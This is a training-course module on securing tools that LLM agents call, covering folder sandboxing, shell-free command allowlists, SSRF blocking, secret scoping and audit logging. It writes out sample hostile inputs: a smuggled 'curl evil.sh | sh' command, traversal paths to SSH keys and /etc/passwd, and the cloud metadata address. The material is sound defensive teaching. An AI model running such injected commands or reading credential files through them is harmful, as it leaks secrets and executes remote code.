# Module 08: Security of tool use

**Time:** about 2 hours.

## Objectives

- Treat every tool argument from a model as **untrusted input**.
- Build a file tool that cannot escape its folder (no path traversal, no symlink tricks).
- Run commands safely: an allowlist, no shell, a timeout and a scrubbed environment.
- Block server-side request forgery (SSRF) in a URL-fetching tool.
- Keep an audit log of every tool decision, with secrets redacted.

## Concepts in plain English

The model chooses tool arguments, and the model can be fooled (Module 05) or simply wrong. So a tool must be safe **no matter what arguments it gets**. Think of each tool as a small public API facing an attacker.

**Least privilege, again, but in code:**

- **Files.** Give the tool one folder (a sandbox). Resolve every path to its real absolute form, following symlinks, and refuse anything outside the folder. `../../.ssh/id_rsa`, `/etc/passwd` and a symlink pointing out of the folder must all fail. Cap file sizes.
- **Commands.** Never pass model text to a shell (`shell=True`, `os.system`). A shell turns `report.txt; curl evil.sh | sh` into two commands. Instead, pass a list of arguments, allow only named programs, set a timeout, and give the process a **minimal environment** so it cannot read your API keys from environment variables.
- **Network.** A "fetch this URL" tool can be pointed at your internal network or the cloud metadata service (`http://169.254.169.254/`), which can hand out credentials. This is **SSRF**. Allow only `https`, only approved hosts, and check that the host's resolved IP addresses are public, not private, loopback or link-local.
- **Secrets.** Tools get only the secrets they need, ideally scoped tokens with limited permissions, never your personal admin key.
- **Audit.** Write every tool call, its (redacted) arguments and the decision to an append-only log. When something goes wrong, you can see exactly what the agent did.

For stronger isolation, run tools in a separate container or a micro-VM sandbox with no network by default. That is how hosted code-execution tools work.

## Step by step

1. Run the demo. It tries a set of attacks against each tool and prints what was blocked:
   ```bash
   python modules/08-tool-use-security/solution/secure_tools.py
   ```
2. In `starter/secure_tools.py`, complete `SandboxedFiles._resolve()`, `run_allowed_command()` and `check_url()`.
3. Test offline:
   ```bash
   TARGET=starter pytest modules/08-tool-use-security
   ```

## Exercises

1. Add a `delete(rel_path)` method that moves files to a `.trash` folder instead of deleting them.
2. Add per-tool rate limits to the audit log class, for example at most 20 file writes per run.
3. Run `run_allowed_command` inside a Docker container with `--network none` and a read-only filesystem.
4. Review an MCP server you use. Which of these checks does it do? Which does it skip?

## Checkpoint quiz

1. Why is `shell=True` dangerous with model-chosen arguments?
2. How does a symlink escape a naive folder check?
3. What is SSRF, and which address is a classic target?
4. Why scrub environment variables for child processes?

<details><summary>Answers</summary>

1. The shell interprets characters like `;`, `|` and `$( )`, so one argument can become several commands.
2. The path looks like it is inside the folder, but the link points outside; only resolving the real path catches it.
3. Server-side request forgery: tricking a server into requesting internal URLs. The cloud metadata address `169.254.169.254` is a classic target.
4. Environment variables often hold API keys and tokens; a child process that does not need them should not see them.
</details>

## Further reading

- OWASP, [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- OWASP, [OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- OWASP, [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- OWASP, [LLM06: Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/)
- Python docs, [subprocess security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- MCP, [Security best practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices)
